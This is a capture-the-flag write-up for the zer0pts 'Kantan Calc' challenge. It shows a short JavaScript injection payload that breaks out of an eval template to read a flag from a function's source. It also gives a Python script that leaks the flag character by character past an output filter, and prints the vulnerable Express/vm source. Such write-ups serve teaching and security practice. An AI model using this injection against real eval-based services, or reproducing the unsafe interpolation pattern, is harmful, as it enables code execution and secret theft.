# Kantan Calc
We can eval up to 29 charactes of js code in a new vm context. Our code is oput after the return statement of an anonymous function which is called and its output is shown on the webpage. The flag is in a comment after our source code in the same anonymous function.
## Ideas:
I knew beforehand that you can obtain a functions source code via .toString() on the function. But the function with the flag in the comment was anonymous so there is way to access it.

Functions in js have an implicity defined variable called arguments[todo mdn link], which not only contains the arguments but has a callee and caller fields as well. Sadly both are not usable in strict mode.

My next try was using an exception/stack trace. I was hoping to access individual stack frames and/or the functions source code. But js exception objects can only generate a stacktrace which contains file/line-nr pairs and no source code.

## Syntactic shenanigans:
After some more googling and trying random stuff i realized that there was no good way to access the anonymous function from within. S took a step back and looked at the source code again
```javascript=
`'use strict'; (function () { return ${code}; /* ${FLAG} */ })()`
```
The code is intended to be a single function with a single return statement but we can insert arbitrary(as long as its less than 30 characters) text.
So my idea was to take the first part
```
'use strict'; (function () { return
```
and make it return a function that takes the 
```
; /* ${FLAG} */ })()
```
part (as its own function) as parameter and calls toString on it.
The only issue is the last paranthesis pair at the end. Our code has to run without an error so our function needs to return something callable again.
Here is my initial solution:
```
(a)=>()=>(a+"")[0]})()(()=>{
```

how it will be executed:
```javascript
'use strict';
(function () { return (a)=>()=>(a+"")[0]})()(()=>{; /* ${FLAG} */ })()

//formated:
(function () {
    return (a)=>()=>(a+"")[0]
})
()
(()=>{; /* ${FLAG} */ })
()
```
We return a function that takes an argument a, which we set to a function that contains only a ; and the flag as the comment.
We now return another function, to be called by the final () in which we convert the function to a string via the +"". This is shorther than toString and does the same.
Now the last part was avoiding the filter that blocks any output containing "zer0pts" which is part of the flag.
I did this by simply leaking one char at a time.

Final exploit:
```python
import requests
import re
def get_flagpos(pos):
    server = "http://web.ctf.zer0pts.com:8002/"
    payload = '(a)=>()=>(a+"")['+str(pos)+']})()(()=>{'
    rq = requests.get(server, {"code":payload})
    return re.search('<output>(.*)</output>', rq.content.decode()).group(1)
"".join([get_flagpos(c) for c in range(10,55)])
```
And we get 'zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3} '

## Kantan Sourcecode:

```const express = require('express');
const path = require('path');
const vm = require('vm');
const FLAG = require('./flag');

const app = express();

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function (req, res, next) {
  let output = '';
  const code = req.query.code + '';

  if (code && code.length < 30) {
    try {
      const result = vm.runInNewContext(`'use strict'; (function () { return ${code}; /* ${FLAG} */ })()`, Object.create(null), { timeout: 100 });
      output = result + '';
      if (output.includes('zer0pts')) {
        output = 'Error: please do not exfiltrate the flag';
      }
    } catch (e) {
      output = 'Error: error occurred';
    }
  } else {
    output = 'Error: invalid code';
  }

  res.render('index', { title: 'Kantan Calc', output });
});

app.get('/source', function (req, res) {
  res.sendFile(path.join(__dirname, 'app.js'));
});

module.exports = app;
```
